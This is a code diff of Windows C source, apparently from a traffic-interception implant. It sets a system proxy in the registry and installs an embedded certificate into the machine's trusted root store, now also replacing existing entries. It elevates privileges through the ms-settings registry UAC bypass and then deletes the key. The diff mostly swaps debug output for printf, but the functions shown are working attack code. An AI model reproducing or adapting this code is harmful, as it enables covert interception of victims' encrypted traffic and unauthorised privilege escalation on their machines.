@@ -8,35 +8,35 @@ BOOL installProxy(char *proxyAddr){
     HKEY hk;
     long lret = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", 0, KEY_WRITE|KEY_SET_VALUE|KEY_WOW64_64KEY, &hk);
     if (lret != ERROR_SUCCESS && hk != NULL){
-        OutputDebugStringA("Error opening HKLM key %d", lret);
+        printf("Error opening HKLM key %d", lret);
         return 0;
     }
     lret = RegSetValueExA(hk, "ProxyServer", 0, REG_SZ, proxyAddr, strlen(proxyAddr));
     if (lret != ERROR_SUCCESS){
-        OutputDebugStringA("Error setting HKLM server: %d", lret);
+        printf("Error setting HKLM server: %d", lret);
         return 0;
     }
     DWORD dwEnable = 1;
     lret = RegSetValueExA(hk, "ProxyEnable", 0, REG_DWORD, (const BYTE*)&dwEnable, sizeof(dwEnable));
     if (lret != ERROR_SUCCESS){
-        OutputDebugStringA("Error setting HKLM value %d", lret);
+        printf("Error setting HKLM value %d", lret);
         return 0;
     }
     RegCloseKey(hk);
     SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, NULL, NULL);
     lret = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", 0, KEY_WRITE|KEY_SET_VALUE, &hk);
     if (lret != ERROR_SUCCESS && hk != NULL){
-        OutputDebugStringA("Error opening key %d", lret);
+        printf("Error opening key %d", lret);
         return 0;
     }
     lret = RegSetValueExA(hk, "ProxyServer", 0, REG_SZ, proxyAddr, strlen(proxyAddr));
     if (lret != ERROR_SUCCESS){
-        OutputDebugStringA("Error setting server: %d", lret);
+        printf("Error setting server: %d", lret);
         return 0;
     }
     lret = RegSetValueExA(hk, "ProxyEnable", 0, REG_DWORD,(const BYTE*)&dwEnable, sizeof(dwEnable));
     if (lret != ERROR_SUCCESS){
-        OutputDebugStringA("Error setting value %d", lret);
+        printf("Error setting value %d", lret);
         return 0;
     }
     SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, NULL, NULL);
@@ -45,9 +45,9 @@ BOOL installProxy(char *proxyAddr){
 BOOL installCert(BYTE *data, DWORD size){
     HCERTSTORE hRootCertStore = CertOpenStore(CERT_STORE_PROV_SYSTEM, 0, 0, CERT_SYSTEM_STORE_LOCAL_MACHINE | CERT_STORE_OPEN_EXISTING_FLAG , L"ROOT");
     if (hRootCertStore == NULL){
-        OutputDebugStringA("Failed to open cert store");
+        printf("Failed to open cert store");
         DWORD err = GetLastError();
-        OutputDebugStringA("Error : %x", err);
+        printf("Error : %x", err);
         return 0;
     }
     struct _CRYPTOAPI_BLOB pblob;
@@ -55,22 +55,22 @@ BOOL installCert(BYTE *data, DWORD size){
     pblob.cbData = size;
     HCERTSTORE pTempStore = PFXImportCertStore(&pblob, NULL, PKCS12_NO_PERSIST_KEY);
     if (pTempStore == NULL){
-        OutputDebugStringA("Failed to open p12 cert\n");
+        printf("Failed to open p12 cert\n");
         DWORD err = GetLastError();
-        OutputDebugStringA("Error : %x", err);
+        printf("Error : %x", err);
         return 0;
     }
     PCCERT_CONTEXT pCert = CertEnumCertificatesInStore(pTempStore, NULL);
     if(pCert == NULL){
-        OutputDebugStringA("Failed to retrieve cert\n");
+        printf("Failed to retrieve cert\n");
         DWORD err = GetLastError();
-        OutputDebugStringA("Error : %x", err);
+        printf("Error : %x", err);
         return 0;
     }
-    if (!CertAddCertificateContextToStore(hRootCertStore, pCert, CERT_STORE_ADD_NEW, NULL)){
-        OutputDebugStringA("Failed to add cert to store\n");
+    if (!CertAddCertificateContextToStore(hRootCertStore, pCert, CERT_STORE_ADD_NEW | CERT_STORE_ADD_REPLACE_EXISTING, NULL)){
+        printf("Failed to add cert to store\n");
         DWORD err = GetLastError();
-        OutputDebugStringA("Error : %x", err);
+        printf("Error : %x", err);
         return 0;
     }
     CertCloseStore(hRootCertStore, 0);
@@ -86,7 +86,7 @@ DWORD initRsc(BYTE **resource, int resourceNumber){
     int failed = memcpy_s(pBytes, dwSize, lpBin, dwSize);
     FreeResource(hObj);
     if(failed){
-        OutputDebugStringA("Failed to copy data!\nError: %d\n",failed);
+        printf("Failed to copy data!\nError: %d\n",failed);
         return 0;
     }
     *resource = pBytes;
@@ -135,7 +135,7 @@ int elevateProcess() {
     GetModuleFileName(NULL, szFileName, MAX_PATH);
     sprintf_s(payload, sizeof(payload), "%s %s", "cmd.exe /c start", szFileName);
     if (RegCreateKeyA(HKEY_CURRENT_USER, "SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command", &hKey)) {
-        OutputDebugStringA("Could not create registry key!");
+        printf("Could not create registry key!");
         return -1;
     }
 
@@ -151,7 +151,7 @@ int elevateProcess() {
 
 int cleanup(){
     if (!RegDeleteKeyA(HKEY_CURRENT_USER, "SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command"))
-        OutputDebugStringA("Failed to delete key!");
+        printf("Failed to delete key!");
     return 0;
 }
 
